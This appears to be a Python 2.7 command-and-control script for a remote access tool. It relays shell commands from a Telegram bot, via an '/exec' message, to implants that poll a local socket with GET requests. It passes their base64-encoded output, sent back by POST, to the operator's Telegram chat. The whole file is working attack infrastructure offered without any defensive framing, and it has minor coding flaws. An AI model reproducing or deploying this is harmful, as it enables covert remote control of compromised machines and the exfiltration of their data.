#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import sys, time, telepot, urllib, socket, base64
from threading import Thread

http_response = """\
HTTP/1.1 200 OK

"""

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.bind(('127.0.0.1',  int(sys.argv[1])))
so.listen(1)


TOKEN = 'token'

print('Conectando ao Telegram....')
time.sleep(1)
chat_id = None
bot = None
EXEC_CMD = '#'
EXECUTED = False

def base64_decode(text):
	x = len(text)
	if x % 4 != 0:
		return base64.b64decode(text+'='*(4-(x%4)))
	else:
		return base64.b64decode(text)

def connect():
    global bot
    bot = telepot.Bot(TOKEN)

connect()

def handler(msg):
    global chat_id, EXEC_CMD
    content_type, chat_type, chat_id = telepot.glance(msg)
    texto = msg['text']
    if '/' in texto:
        if texto.split(' ')[0] == '/exec':
            try:
            	EXEC_CMD = str(' '.join(texto.split(' ')[1:]))
                print 'New command: ' + str(' '.join(texto.split(' ')[1:]))
            except Exception as erro:
            	print 'Erro: ' + str(erro)

def receive():
    bot.message_loop(handler)


t_receive = Thread(target=receive())
t_receive.start()


def handlerr(msg, sock):
    global so, chat_id, EXEC_CMD, EXECUTED
    if 'GET' in msg:
        if EXECUTED == False:
            sock.sendall(http_response+base64.b64encode(EXEC_CMD))
            sock.close()
            if EXEC_CMD != '#':
                EXECUTED = True
        else:
            EXEC_CMD = '#'
            EXECUTED = False
    if chat_id == None:
        return
    elif 'POST' in msg:
        try:
            out = base64_decode(msg.split('SPLITHERE')[1][1:].split('%')[0][:-1])
        except:
            return
        if not out == '' or out == ' ':
            bot.sendMessage(chat_id, out)
        sock.close()

def receiver():
	global so
	try:
        	sock, data = so.accept()
        except:
		so.close()
	dados = sock.recv(1024)
	handlerr(dados, sock)

def loop():
	global so
	try:
		while 1:
			receiver()
	except Exception as erro:
		print 'ERRO: '+ str(erro)
	finally:
		so.close()

loop()
